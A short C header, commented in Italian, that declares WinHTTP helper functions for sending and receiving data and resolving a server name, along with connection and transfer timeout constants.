#ifndef _WIN_HTTP
#define _WIN_HTTP

#define START_TIMEOUT 60000 // un minuto di attesa per far inizializzare il processo host ASP
#define CONNECT_TIMEOUT 10000 // timeout prima di determinare che il server non e' raggiungibile
#define RESOLVE_TIMEOUT 10000
#define SEND_TIMEOUT 600000
#define RECV_TIMEOUT 600000

PBYTE WinHTTPGetResponse(PULONG uOut);
BOOL WinHTTPSendData(PBYTE pBuffer, ULONG uBuffLen);
BOOL WinHTTPSetup(PBYTE pServerUrl, PBYTE pAddrToConnect, ULONG uBufLen, PULONG pPortToConnect);
BOOL ResolveName(PBYTE pServerUrl, PBYTE pAddrToConnect, ULONG uBufLen);


#endif